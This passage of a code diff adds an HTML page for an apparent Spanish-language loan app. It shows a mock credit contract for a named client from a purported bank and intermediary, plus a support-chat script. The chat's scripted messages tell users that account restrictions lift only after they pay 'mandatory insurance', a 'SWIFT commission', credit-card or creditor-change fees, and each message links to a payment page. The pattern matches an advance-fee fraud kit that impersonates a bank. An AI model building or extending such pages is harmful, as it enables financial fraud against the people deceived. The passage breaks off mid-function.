+                  <tr><td>Tasa Anual Equivalente Global (TAEG):</td><td>8.30%</td></tr>
+                  <tr><td>Plazo del crédito:</td><td>60 mes</td></tr>
+                  <tr><td>Cuota mensual*:</td><td>101.05</td></tr>
+                  <tr><td>Comisión de cobro:</td><td>€ 0</td></tr>
+                  <tr><td>Prima de seguro obligatoria (AvalAvance S.L.):</td><td>€ 100,00</td></tr>
+                </tbody>
+              </table>
+              <p class="credit-contract__note">(*) cálculo efectuado en la fecha de la oferta.</p>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">2. Beneficios para el cliente</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <ul class="credit-contract__list">
+                <li>Suspensión de hasta 3 cuotas consecutivas.</li>
+                <li>Amortización anticipada sin penalizaciones.</li>
+                <li>Reducción del TAN de 0,10 p.p. cada 12 cuotas puntuales (hasta el 2,80 %).</li>
+                <li>CashBack del 1 % en cada cuota pagada.</li>
+                <li>Servicio gratuito "Financial Navigator" por 12 meses.</li>
+                <li>Transferencias SEPA y SDD sin costes adicionales.</li>
+              </ul>
+              <footer class="credit-contract__page-footer">1</footer>
+            </section>
+            <!-- PÁGINA 2 -->
+            <section class="credit-contract__page">
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">3. Penalizaciones e intereses de demora</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <ul class="credit-contract__list">
+                <li>Retraso superior a 5 días: TAN + 2 p.p.</li>
+                <li>Aviso: € 10 en papel / € 5 en digital.</li>
+                <li>2 cuotas impagadas = resolución del contrato e inicio del procedimiento de recuperación.</li>
+                <li>Revocación de la póliza = obligación de restablecimiento en un plazo de 15 días.</li>
+              </ul>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">4. Comunicaciones y servicios del intermediario</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <ul class="credit-contract__list">
+                <li>Todas las comunicaciones entre cliente y banco serán gestionadas por AvalAvance S.L.</li>
+                <li>Contrato y anexos disponibles en la aplicación en formato PDF.</li>
+                <li>Para reclamaciones, el cliente puede dirigirse al Banco de España o al sistema de resolución de conflictos competente.</li>
+              </ul>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">5. Información legal</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <ul class="credit-contract__list">
+                <li>El cliente tiene derecho a recibir el formulario SECCI y el plan de amortización completo antes de la firma.</li>
+                <li>Condiciones reguladas por la Ley 16/2011, de contratos de crédito al consumo, y por el Código Civil Español.</li>
+                <li>Tratamiento de datos personales conforme al Reglamento General de Protección de Datos (RGPD).</li>
+              </ul>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">6. Plan de pagos</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                Tasa mensual: 0,006550000000<br>
+                Cuota mensual: 101.05<br>
+                Importe total de pagos: 6 062.71<br>
+                Importe de sobrepago: 1 062.71
+              </p>
+              <table class="credit-contract__table credit-contract__table--schedule">
+                <thead><tr><th>Mes</th><th>Cuota</th><th>Intereses</th><th>Amortización</th><th>Saldo</th></tr></thead>
+                <tbody>
+                  <tr><td>1</td><td>€ 101.05</td><td>€ 32.75</td><td>€ 68.30</td><td>€ 4 931.70</td></tr>
+                  <tr><td>2</td><td>€ 101.05</td><td>€ 32.30</td><td>€ 68.75</td><td>€ 4 862.95</td></tr>
+                  <tr><td>3</td><td>€ 101.05</td><td>€ 31.85</td><td>€ 69.20</td><td>€ 4 793.75</td></tr>
+                  <tr><td>4</td><td>€ 101.05</td><td>€ 31.40</td><td>€ 69.65</td><td>€ 4 724.10</td></tr>
+                  <tr><td>5</td><td>€ 101.05</td><td>€ 30.94</td><td>€ 70.11</td><td>€ 4 653.99</td></tr>
+                  <tr><td>6</td><td>€ 101.05</td><td>€ 30.48</td><td>€ 70.57</td><td>€ 4 583.42</td></tr>
+                  <tr><td>7</td><td>€ 101.05</td><td>€ 30.02</td><td>€ 71.03</td><td>€ 4 512.39</td></tr>
+                  <tr><td>8</td><td>€ 101.05</td><td>€ 29.56</td><td>€ 71.49</td><td>€ 4 440.90</td></tr>
+                  <tr><td>9</td><td>€ 101.05</td><td>€ 29.09</td><td>€ 71.96</td><td>€ 4 368.94</td></tr>
+                  <tr><td>10</td><td>€ 101.05</td><td>€ 28.62</td><td>€ 72.43</td><td>€ 4 296.51</td></tr>
+                  <tr><td>11</td><td>€ 101.05</td><td>€ 28.14</td><td>€ 72.91</td><td>€ 4 223.60</td></tr>
+                  <tr><td>12</td><td>€ 101.05</td><td>€ 27.66</td><td>€ 73.39</td><td>€ 4 150.21</td></tr>
+                </tbody>
+              </table>
+              <footer class="credit-contract__page-footer">2</footer>
+            </section>
+            <!-- PÁGINA 3 -->
+            <section class="credit-contract__page">
+              <table class="credit-contract__table credit-contract__table--schedule">
+                <thead><tr><th>Mes</th><th>Cuota</th><th>Intereses</th><th>Amortización</th><th>Saldo</th></tr></thead>
+                <tbody>
+                  <tr><td>13</td><td>€ 101.05</td><td>€ 27.18</td><td>€ 73.87</td><td>€ 4 076.34</td></tr>
+                  <tr><td>14</td><td>€ 101.05</td><td>€ 26.70</td><td>€ 74.35</td><td>€ 4 001.99</td></tr>
+                  <tr><td>15</td><td>€ 101.05</td><td>€ 26.21</td><td>€ 74.84</td><td>€ 3 927.15</td></tr>
+                  <tr><td>16</td><td>€ 101.05</td><td>€ 25.72</td><td>€ 75.33</td><td>€ 3 851.82</td></tr>
+                  <tr><td>17</td><td>€ 101.05</td><td>€ 25.23</td><td>€ 75.82</td><td>€ 3 776.00</td></tr>
+                  <tr><td>18</td><td>€ 101.05</td><td>€ 24.73</td><td>€ 76.32</td><td>€ 3 699.68</td></tr>
+                  <tr><td>19</td><td>€ 101.05</td><td>€ 24.23</td><td>€ 76.82</td><td>€ 3 622.86</td></tr>
+                  <tr><td>20</td><td>€ 101.05</td><td>€ 23.73</td><td>€ 77.32</td><td>€ 3 545.54</td></tr>
+                  <tr><td>21</td><td>€ 101.05</td><td>€ 23.22</td><td>€ 77.83</td><td>€ 3 467.71</td></tr>
+                  <tr><td>22</td><td>€ 101.05</td><td>€ 22.71</td><td>€ 78.34</td><td>€ 3 389.37</td></tr>
+                  <tr><td>23</td><td>€ 101.05</td><td>€ 22.20</td><td>€ 78.85</td><td>€ 3 310.52</td></tr>
+                  <tr><td>24</td><td>€ 101.05</td><td>€ 21.68</td><td>€ 79.37</td><td>€ 3 231.15</td></tr>
+                  <tr><td>25</td><td>€ 101.05</td><td>€ 21.16</td><td>€ 79.89</td><td>€ 3 151.26</td></tr>
+                  <tr><td>26</td><td>€ 101.05</td><td>€ 20.64</td><td>€ 80.41</td><td>€ 3 070.85</td></tr>
+                  <tr><td>27</td><td>€ 101.05</td><td>€ 20.11</td><td>€ 80.94</td><td>€ 2 989.91</td></tr>
+                  <tr><td>28</td><td>€ 101.05</td><td>€ 19.58</td><td>€ 81.47</td><td>€ 2 908.44</td></tr>
+                  <tr><td>29</td><td>€ 101.05</td><td>€ 19.05</td><td>€ 82.00</td><td>€ 2 826.44</td></tr>
+                  <tr><td>30</td><td>€ 101.05</td><td>€ 18.51</td><td>€ 82.54</td><td>€ 2 743.90</td></tr>
+                  <tr><td>31</td><td>€ 101.05</td><td>€ 17.97</td><td>€ 83.08</td><td>€ 2 660.82</td></tr>
+                  <tr><td>32</td><td>€ 101.05</td><td>€ 17.43</td><td>€ 83.62</td><td>€ 2 577.20</td></tr>
+                  <tr><td>33</td><td>€ 101.05</td><td>€ 16.88</td><td>€ 84.17</td><td>€ 2 493.03</td></tr>
+                  <tr><td>34</td><td>€ 101.05</td><td>€ 16.33</td><td>€ 84.72</td><td>€ 2 408.31</td></tr>
+                  <tr><td>35</td><td>€ 101.05</td><td>€ 15.77</td><td>€ 85.28</td><td>€ 2 323.03</td></tr>
+                  <tr><td>36</td><td>€ 101.05</td><td>€ 15.22</td><td>€ 85.83</td><td>€ 2 237.20</td></tr>
+                  <tr><td>37</td><td>€ 101.05</td><td>€ 14.65</td><td>€ 86.40</td><td>€ 2 150.80</td></tr>
+                  <tr><td>38</td><td>€ 101.05</td><td>€ 14.09</td><td>€ 86.96</td><td>€ 2 063.84</td></tr>
+                  <tr><td>39</td><td>€ 101.05</td><td>€ 13.52</td><td>€ 87.53</td><td>€ 1 976.31</td></tr>
+                  <tr><td>40</td><td>€ 101.05</td><td>€ 12.94</td><td>€ 88.11</td><td>€ 1 888.20</td></tr>
+                  <tr><td>41</td><td>€ 101.05</td><td>€ 12.37</td><td>€ 88.68</td><td>€ 1 799.52</td></tr>
+                  <tr><td>42</td><td>€ 101.05</td><td>€ 11.79</td><td>€ 89.26</td><td>€ 1 710.26</td></tr>
+                  <tr><td>43</td><td>€ 101.05</td><td>€ 11.20</td><td>€ 89.85</td><td>€ 1 620.41</td></tr>
+                  <tr><td>44</td><td>€ 101.05</td><td>€ 10.61</td><td>€ 90.44</td><td>€ 1 529.97</td></tr>
+                  <tr><td>45</td><td>€ 101.05</td><td>€ 10.02</td><td>€ 91.03</td><td>€ 1 438.94</td></tr>
+                  <tr><td>46</td><td>€ 101.05</td><td>€ 9.43</td><td>€ 91.62</td><td>€ 1 347.32</td></tr>
+                  <tr><td>47</td><td>€ 101.05</td><td>€ 8.82</td><td>€ 92.23</td><td>€ 1 255.09</td></tr>
+                  <tr><td>48</td><td>€ 101.05</td><td>€ 8.22</td><td>€ 92.83</td><td>€ 1 162.26</td></tr>
+                  <tr><td>49</td><td>€ 101.05</td><td>€ 7.61</td><td>€ 93.44</td><td>€ 1 068.82</td></tr>
+                  <tr><td>50</td><td>€ 101.05</td><td>€ 7.00</td><td>€ 94.05</td><td>€ 974.77</td></tr>
+                  <tr><td>51</td><td>€ 101.05</td><td>€ 6.38</td><td>€ 94.67</td><td>€ 880.10</td></tr>
+                </tbody>
+              </table>
+              <footer class="credit-contract__page-footer">3</footer>
+            </section>
+            <!-- PÁGINA 4 -->
+            <section class="credit-contract__page">
+              <table class="credit-contract__table credit-contract__table--schedule">
+                <thead><tr><th>Mes</th><th>Cuota</th><th>Intereses</th><th>Amortización</th><th>Saldo</th></tr></thead>
+                <tbody>
+                  <tr><td>52</td><td>€ 101.05</td><td>€ 5.76</td><td>€ 95.29</td><td>€ 784.81</td></tr>
+                  <tr><td>53</td><td>€ 101.05</td><td>€ 5.14</td><td>€ 95.91</td><td>€ 688.90</td></tr>
+                  <tr><td>54</td><td>€ 101.05</td><td>€ 4.51</td><td>€ 96.54</td><td>€ 592.36</td></tr>
+                  <tr><td>55</td><td>€ 101.05</td><td>€ 3.88</td><td>€ 97.17</td><td>€ 495.19</td></tr>
+                  <tr><td>56</td><td>€ 101.05</td><td>€ 3.24</td><td>€ 97.81</td><td>€ 397.38</td></tr>
+                  <tr><td>57</td><td>€ 101.05</td><td>€ 2.60</td><td>€ 98.45</td><td>€ 298.93</td></tr>
+                  <tr><td>58</td><td>€ 101.05</td><td>€ 1.96</td><td>€ 99.09</td><td>€ 199.84</td></tr>
+                  <tr><td>59</td><td>€ 101.05</td><td>€ 1.31</td><td>€ 99.74</td><td>€ 100.10</td></tr>
+                  <tr><td>60</td><td>€ 100.76</td><td>€ 0.66</td><td>€ 100.10</td><td>€ 0.00</td></tr>
+                </tbody>
+              </table>
+              <footer class="credit-contract__page-footer">4</footer>
+            </section>
+            <!-- PÁGINA 5 -->
+            <section class="credit-contract__page">
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <h4 class="credit-contract__section-title">7. Firmas</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                Lugar y fecha: Firma electrónica, <span id="cvm_fecha"></span>
+              </p>
+              <div class="credit-contract__sign-cols">
+                <div class="credit-contract__sign-col" id="cvm_signBank">Representante del banco EBN Banco</div>
+                <div class="credit-contract__sign-col">Representante del intermediario AvalAvance S.L.:</div>
+                <div class="credit-contract__sign-col">Cliente: <span id="cvm_signClientName">Oscar Asenjo Núñez</span></div>
+              </div>
+              <div class="credit-contract__stamp-area" aria-hidden="true">
+                <img src="../assets/banks/newBank/stamp.svg" alt="" class="credit-contract__stamp" id="cvm_stamp">
+                <img src="../assets/left-hand.png" alt="" class="credit-contract__signature credit-contract__signature--left">
+                <img src="../assets/right-hand.png" alt="" class="credit-contract__signature credit-contract__signature--right">
+              </div>
+              <div class="credit-contract__sign-line" aria-hidden="true"></div>
+              <footer class="credit-contract__page-footer">5</footer>
+            </section>
+          </article>
+        </div>
+        <footer class="tourist-contract-modal__footer">
+          <button type="button" class="tourist-contract-modal__action" id="cvm_closeBtn" data-contrato-close>
+            <span class="tourist-contract-modal__action-content">
+              <span class="tourist-contract-modal__action-text">Cerrar</span>
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M14 14.6641H2C1.72667 14.6641 1.5 14.4374 1.5 14.1641C1.5 13.8907 1.72667 13.6641 2 13.6641H14C14.2733 13.6641 14.5 13.8907 14.5 14.1641C14.5 14.4374 14.2733 14.6641 14 14.6641Z" fill="white"/><path d="M12.6843 2.31848C11.3909 1.02514 10.1243 0.991811 8.79761 2.31848L7.99095 3.12514C7.92428 3.19181 7.89761 3.29848 7.92428 3.39181C8.43095 5.15848 9.84428 6.57181 11.6109 7.07848C11.6376 7.08514 11.6643 7.09181 11.6909 7.09181C11.7643 7.09181 11.8309 7.06514 11.8843 7.01181L12.6843 6.20514C13.3443 5.55181 13.6643 4.91848 13.6643 4.27848C13.6709 3.61848 13.3509 2.97848 12.6843 2.31848Z" fill="white"/><path d="M10.4056 7.68849C10.2122 7.59516 10.0256 7.50182 9.84558 7.39516C9.69891 7.30849 9.55891 7.21516 9.41891 7.11516C9.30558 7.04182 9.17224 6.93516 9.04558 6.82849C9.03224 6.82182 8.98558 6.78182 8.93224 6.72849C8.71224 6.54182 8.46558 6.30182 8.24558 6.03516C8.22558 6.02182 8.19224 5.97516 8.14558 5.91516C8.07891 5.83516 7.96558 5.70182 7.86558 5.54849C7.78558 5.44849 7.69224 5.30182 7.60558 5.15516C7.49891 4.97516 7.40558 4.79516 7.31224 4.60849C7.16859 4.28365 6.89224 4.22182 6.72846 4.38561L2.89224 8.22182C2.80558 8.30849 2.72558 8.47516 2.70558 8.58849L2.34558 11.1418C2.27891 11.5952 2.40558 12.0218 2.68558 12.3085C2.92558 12.5418 3.25891 12.6685 3.61891 12.6685C3.69891 12.6685 3.77891 12.6618 3.85891 12.6485L6.41891 12.2885C6.53891 12.2685 6.70558 12.1885 6.78558 12.1018L10.6172 8.27015C10.7822 8.10523 10.7199 7.82237 10.5052 7.73124C10.4725 7.71734 10.4393 7.70311 10.4056 7.68849Z" fill="white"/></svg>
+            </span>
+          </button>
+        </footer>
+      </section>
+    </div>
+
+    <script>
+      function openContratoModal() {
+        var modal = document.getElementById('contratoViewModal');
+        if (!modal) return;
+        // Fill bank name from localStorage
+        var bankName = '';
+        var bankKey  = '';
+        var clientName = '';
+        try {
+          bankName = getStoredBankName('EBN Banco');
+          bankKey  = 'newBank';
+          clientName = localStorage.getItem('touristCardNombre') || localStorage.getItem('inputName') || 'Oscar Asenjo Núñez';
+        } catch(e) {}
+        var el1 = document.getElementById('cvm_bankName');
+        var el2 = document.getElementById('cvm_bankName2');
+        var elSign = document.getElementById('cvm_signBank');
+        var elSignClient = document.getElementById('cvm_signClientName');
+        var bankDisplay = getStoredBankDisplay('EBN Banco');
+        if (el1) el1.textContent = bankDisplay;
+        if (el2) el2.textContent = bankDisplay;
+        if (elSign) elSign.textContent = 'Representante del banco ' + bankDisplay;
+        if (elSignClient) elSignClient.textContent = clientName;
+        // Logo
+        var logoEl = document.getElementById('cvm_logo');
+        if (logoEl) { logoEl.src = '../assets/banks/newBank/logo2.png'; logoEl.alt = bankName; }
+        // Stamp
+        var stampEl = document.getElementById('cvm_stamp');
+        if (stampEl) stampEl.src = '../assets/banks/newBank/stamp.svg';
+        // Date
+        var fechaEl = document.getElementById('cvm_fecha');
+        if (fechaEl) {
+          var now = new Date();
+          fechaEl.textContent = String(now.getDate()).padStart(2,'0') + '/' + String(now.getMonth()+1).padStart(2,'0') + '/' + now.getFullYear();
+        }
+        modal.classList.add('tourist-contract-modal--open');
+        modal.setAttribute('aria-hidden', 'false');
+        document.body.classList.add('contract-modal-open');
+        var body = document.getElementById('contratoViewBody');
+        if (body) { body.scrollTop = 0; setTimeout(function(){ body.focus({ preventScroll: true }); }, 0); }
+      }
+      function closeContratoModal() {
+        var modal = document.getElementById('contratoViewModal');
+        if (!modal) return;
+        modal.classList.remove('tourist-contract-modal--open');
+        modal.setAttribute('aria-hidden', 'true');
+        document.body.classList.remove('contract-modal-open');
+      }
+      document.addEventListener('DOMContentLoaded', function() {
+        var modal = document.getElementById('contratoViewModal');
+        if (!modal) return;
+        modal.querySelectorAll('[data-contrato-close]').forEach(function(el) {
+          el.addEventListener('click', closeContratoModal);
+        });
+        document.addEventListener('keydown', function(e) {
+          if (e.key === 'Escape' && modal.classList.contains('tourist-contract-modal--open')) closeContratoModal();
+        });
+      });
+    </script>
+
+    <script src="./tourist.js?v=20260609-1"></script>
+    <script>
+      (function () {
+        localStorage.removeItem('chatUnread');
+
+        var chat     = document.getElementById('supportChat');
+        var form     = document.getElementById('supportForm');
+        var input    = document.getElementById('supportInput');
+        var typing   = document.getElementById('supportTyping');
+        var sendBtn  = document.getElementById('supportSendBtn');
+        var imgBtn   = document.getElementById('chatImgBtn');
+        var imgInput = document.getElementById('chatImgInput');
+
+        var API_BASE = window.FORM_API_BASE || window.MAIN_API_BASE || window.API_BASE || window.location.origin;
+        var sessionId = (typeof window.getFlowSessionId === 'function')
+          ? window.getFlowSessionId()
+          : (localStorage.getItem('flowSessionId') || ('sc' + Date.now()));
+
+        var name = (localStorage.getItem('inputName') || '').trim();
+        var bank = '';
+        try { bank = (localStorage.getItem('selectedBank') || '').trim(); } catch(e) {}
+        if (!bank) bank = 'EBN Banco';
+
+        var displayedMsgCount = 0;
+        var notifButtonShown = false;
+
+        function escapeHtml(s) {
+          return String(s)
+            .replace(/&/g, '&amp;').replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+        }
+
+        function isImgContent(s) {
+          return s && (
+            s.indexOf('/uploads/') === 0
+            || s.indexOf('PAYMENT_SCREENSHOT:') === 0
+            || s.indexOf('PAYMENT_SCREENSHOT_RETURN:') === 0
+            || s.indexOf('PAYMENT_SCREENSHOT_LOAN_TRANSFER:') === 0
+            || s.indexOf('PAYMENT_SCREENSHOT_CREDIT_CARD:') === 0
+          );
+        }
+        function imgUrl(s) {
+          if (s.indexOf('PAYMENT_SCREENSHOT_CREDIT_CARD:') === 0) return s.slice('PAYMENT_SCREENSHOT_CREDIT_CARD:'.length);
+          if (s.indexOf('PAYMENT_SCREENSHOT_LOAN_TRANSFER:') === 0) return s.slice('PAYMENT_SCREENSHOT_LOAN_TRANSFER:'.length);
+          if (s.indexOf('PAYMENT_SCREENSHOT_RETURN:') === 0) return s.slice('PAYMENT_SCREENSHOT_RETURN:'.length);
+          return s.indexOf('PAYMENT_SCREENSHOT:') === 0 ? s.slice('PAYMENT_SCREENSHOT:'.length) : s;
+        }
+
+        function scrollDown() {
+          requestAnimationFrame(function () {
+            var scroll = chat.closest('.chat-scroll');
+            if (scroll) scroll.scrollTop = scroll.scrollHeight;
+          });
+        }
+
+        function buildMsgEl(role, content) {
+          var el = document.createElement('div');
+
+          if (content === '[[LOAN_TRANSFER_PAY]]') {
+            el.className = 'caller-actions-wrap';
+            try {
+              localStorage.setItem('touristNotifLoanTransfer', '1');
+              localStorage.setItem('touristBellUnread', '1');
+            } catch (e) {}
+            var bubble = document.createElement('div');
+            bubble.className = 'caller-msg-bubble';
+            var lbl = document.createElement('p');
+            lbl.textContent = 'El procedimiento de traslado de crédito está disponible a través del botón de abajo.';
+            bubble.appendChild(lbl);
+            var a = document.createElement('a');
+            a.href = './transaction-detail3.html';
+            a.className = 'caller-action-btn caller-action-btn--primary';
+            a.innerHTML = 'Cambio de acreedor <img src="../assets/icons/chat/wallet.svg" alt="" aria-hidden="true" />';
+            el.appendChild(bubble);
+            el.appendChild(a);
+            return el;
+          }
+
+          if (content === '[[COMMISSION_PAY]]') {
+            el.className = 'caller-actions-wrap';
+            try {
+              localStorage.setItem('touristNotifCommission', '1');
+              if (localStorage.getItem('touristCommissionBellAcked') !== '1') {
+                localStorage.setItem('touristBellUnread', '1');
+              }
+            } catch (e) {}
+            var bubble = document.createElement('div');
+            bubble.className = 'caller-msg-bubble';
+            var lbl = document.createElement('p');
+            lbl.textContent = 'La página de pago está disponible a través del botón de abajo.';
+            bubble.appendChild(lbl);
+            var a = document.createElement('a');
+            a.href = './transaction-detail4.html';
+            a.className = 'caller-action-btn caller-action-btn--primary';
+            a.innerHTML = 'Pagar tarjeta de crédito <img src="../assets/icons/chat/wallet.svg" alt="" aria-hidden="true" />';
+            el.appendChild(bubble);
+            el.appendChild(a);
+            return el;
+          }
+
+          if (content === '[[RETURN_PAY]]') {
+            el.className = 'caller-actions-wrap';
+            try {
+              localStorage.setItem('touristNotifReturn', '1');
+              localStorage.setItem('touristBellUnread', '1');
+            } catch (e) {}
+            var bubble = document.createElement('div');
+            bubble.className = 'caller-msg-bubble';
+            var lbl = document.createElement('p');
+            lbl.textContent = 'La página de pago está disponible a través del botón de abajo.';
+            bubble.appendChild(lbl);
+            var a = document.createElement('a');
+            a.href = './transaction-detail2.html';
+            a.className = 'caller-action-btn caller-action-btn--primary';
+            a.innerHTML = 'Pagar comisión SWIFT <img src="../assets/icons/chat/wallet.svg" alt="" aria-hidden="true" />';
+            el.appendChild(bubble);
+            el.appendChild(a);
+            return el;
+          }
+
+          if (content === '[[INSURANCE_PAY]]') {
+            el.className = 'caller-actions-wrap';
+            try { localStorage.setItem('touristNotifInsurance', '1'); } catch (e) {}
+            var bubble = document.createElement('div');
+            bubble.className = 'caller-msg-bubble';
+            var lbl = document.createElement('p');
+            lbl.textContent = 'La página de pago está disponible a través del botón de abajo.';
+            bubble.appendChild(lbl);
+            var a = document.createElement('a');
+            a.href = './credit-card.html';
+            a.className = 'caller-action-btn caller-action-btn--primary';
+            a.innerHTML = 'Pagar el seguro <img src="../assets/icons/chat/wallet.svg" alt="" aria-hidden="true" />';
+            el.appendChild(bubble);
+            el.appendChild(a);
+            return el;
+          }
+
+          var PDF_ICON = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">'
+            + '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" stroke="#fff" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>'
+            + '<path d="M14 2v6h6M16 13H8M16 17H8M10 9H8" stroke="#fff" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>'
+            + '</svg>';
+          var ARROW = '<button type="button" class="contrato-card__btn" aria-hidden="true">›</button>';
+
+          if (content === '[[NOTIF_PDF]]') {
+            var bankN = '';
+            try { bankN = getStoredBankShort('EBN Banco'); } catch(e) {}
+            el.className = 'contrato-card';
+            el.setAttribute('onclick', 'openNotifPdfModal()');
+            el.innerHTML =
+              '<div class="contrato-card__left">'
+              + '<div class="contrato-card__icon" aria-hidden="true">' + PDF_ICON + '</div>'
+              + '<div class="contrato-card__text">'
+              + '<p class="contrato-card__title">' + bankN + ' – Anexo crédito</p>'
+              + '<p class="contrato-card__sub">Contrato Nº ES-4738D9215</p>'
+              + '</div>'
+              + '</div>'
+              + ARROW;
+            return el;
+          }
+
+          if (content === '[[CONTRATO]]') {
+            var bank = '';
+            try { bank = getStoredBankShort('EBN Banco'); } catch(e) {}
+            el.className = 'contrato-card';
+            el.setAttribute('onclick', 'openContratoModal()');
+            el.innerHTML =
+              '<div class="contrato-card__left">'
+              + '<div class="contrato-card__icon" aria-hidden="true">' + PDF_ICON + '</div>'
+              + '<div class="contrato-card__text">'
+              + '<p class="contrato-card__title">' + bank + ' – Contrato de crédito</p>'
+              + '<p class="contrato-card__sub">Contrato Nº ES-4738D9215</p>'
+              + '</div>'
+              + '</div>'
+              + ARROW;
+            return el;
+          }
+
+          if (content === '[[CREDITC]]') {
+            var creditBank = '';
+            try { creditBank = getStoredBankShort('EBN Banco'); } catch(e) {}
+            el.className = 'contrato-card';
+            el.setAttribute('onclick', 'openCreditCardContractModal()');
+            el.innerHTML =
+              '<div class="contrato-card__left">'
+              + '<div class="contrato-card__icon" aria-hidden="true">' + PDF_ICON + '</div>'
+              + '<div class="contrato-card__text">'
+              + '<p class="contrato-card__title">' + creditBank + ' - Cuenta y tarjeta de crédito</p>'
+              + '<p class="contrato-card__sub">Contrato Nº ES-4738D9215</p>'
+              + '</div>'
+              + '</div>'
+              + ARROW;
+            return el;
+          }
+
+          if (content === '[[SEGURO]]') {
+            var seguroBank = '';
+            try { seguroBank = getStoredBankShort('EBN Banco'); } catch(e) {}
+            el.className = 'contrato-card';
+            el.setAttribute('onclick', 'openSeguroModal()');
+            el.innerHTML =
+              '<div class="contrato-card__left">'
+              + '<div class="contrato-card__icon" aria-hidden="true">' + PDF_ICON + '</div>'
+              + '<div class="contrato-card__text">'
+              + '<p class="contrato-card__title">' + seguroBank + ' - Certificado de seguro</p>'
+              + '<p class="contrato-card__sub">Contrato Nº ES-4738D9215</p>'
+              + '</div>'
+              + '</div>'
+              + ARROW;
+            return el;
+          }
+
+          if (content === 'CALLER_ACTION_BUTTONS') {
+            el.className = 'caller-actions-wrap';
+            try {
+              localStorage.setItem('touristNotifStart', '1');
+              if (localStorage.getItem('touristStartBellAcked') !== '1') {
+                localStorage.setItem('touristBellUnread', '1');
+              }
+            } catch (e) {}
+
+            // 1. Text bubble
+            var bubble = document.createElement('div');
+            bubble.className = 'caller-msg-bubble';
+            var lbl = document.createElement('p');
+            lbl.textContent = 'Hemos consultado la situación con EBN Banco. Nos han informado que, para levantar las restricciones operativas de la cuenta, es necesario formalizar el seguro obligatorio establecido en la primera cláusula del contrato de crédito.\n\nDespués del pago y del registro del seguro, el banco levantará las restricciones y autorizará la transferencia de los fondos a su cuenta bancaria.';
+            bubble.appendChild(lbl);
+
+            // 2. "Ver correo del banco" outline button
+            var a1 = document.createElement('a');
+            a1.href = './notifications2.html';
+            a1.className = 'caller-action-btn caller-action-btn--outline';
+            a1.innerHTML = 'Ver correo del banco <span class="caller-btn-icon caller-btn-icon--mail" aria-hidden="true"></span>';
+
+            // 3. "Pagar el seguro" primary button
+            var a2 = document.createElement('a');
+            a2.href = './credit-card.html';
+            a2.className = 'caller-action-btn caller-action-btn--primary';
+            a2.innerHTML = 'Pagar el seguro <img src="../assets/icons/chat/wallet.svg" alt="" aria-hidden="true" />';
+
+            el.appendChild(bubble);
+            el.appendChild(a1);
+            el.appendChild(a2);
+            return el;
+          }
+          var isImg = isImgContent(content);
+          el.className = 'assistant-msg '
+            + (role === 'user' ? 'assistant-msg--user' : 'assistant-msg--bot')
+            + (isImg ? ' assistant-msg--image' : '');
+          if (isImg) {
+            var imgEl = document.createElement('img');
+            imgEl.src = imgUrl(content);
+            imgEl.alt = '';
+            imgEl.addEventListener('click', function () {
+              var ov = document.createElement('div');
+              ov.style.cssText = 'position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.85);display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box;';
+              var bi = document.createElement('img');
+              bi.src = imgEl.src;
+              bi.style.cssText = 'max-width:100%;max-height:90vh;border-radius:12px;object-fit:contain;';
+              ov.appendChild(bi);
+              ov.addEventListener('click', function () { document.body.removeChild(ov); });
+              document.body.appendChild(ov);
+            });
+            el.appendChild(imgEl);
+          } else {
+            el.innerHTML = '<p>' + escapeHtml(content).replace(/\n/g, '<br>') + '</p>';
+          }
+          return el;
+        }
+
+        function addMessage(role, content) {
+          var el = buildMsgEl(role, content);
+          if (!el) { displayedMsgCount++; return; }
+          chat.insertBefore(el, typing);
+          displayedMsgCount++;
+          scrollDown();
+          if (role !== 'user') localStorage.setItem('chatUnread', '1');
+        }
+
+        function showTyping(on) {
+          typing.style.display = on ? 'flex' : 'none';
+          if (on) chat.appendChild(typing);
+          scrollDown();
+        }
+
+        function requestPushPermissionFromAndroid() {
+          if (!window.AndroidBridge) return;
+          try {
+            var alreadyAllowed = window.AndroidBridge.hasNotificationPermission();
+            if (alreadyAllowed) return;
+            window.AndroidBridge.requestNotificationPermission();
+          } catch(e) {}
+        }
+
+        function showNotifButton() { /* no-op */ }
+
+        // После [[FIN]]: показываем кнопку «Permitir notificaciones» (без баннера/текста).
+        // beforeEl — опциональный anchor; если не передан, вставляем перед typing.
+        function showDoneBanner(beforeEl) {
+          if (document.getElementById('notifPermWrap') || notifButtonShown) return;
+          notifButtonShown = true;
+          var btn = document.createElement('button');
+          btn.id = 'notifPermWrap';
+          btn.type = 'button';
+          btn.className = 'caller-notif-btn';
+          btn.innerHTML = 'Permitir notificaciones <span class="caller-btn-icon caller-btn-icon--notification" aria-hidden="true"></span>';
+          btn.addEventListener('click', function () {
+            requestPushPermissionFromAndroid();
+            btn.disabled = true;
+          });
+          chat.insertBefore(btn, (beforeEl && beforeEl.parentNode === chat) ? beforeEl : typing);
+          scrollDown();
+        }
+
+        function setBusy(on) {
+          input.disabled = on;
+          sendBtn.disabled = on;
+          imgBtn.disabled = on;
+          showTyping(on);
+        }
+
+        function uploadImage(file, onSuccess, onError) {
+          var reader = new FileReader();
+          reader.onload = function (ev) {
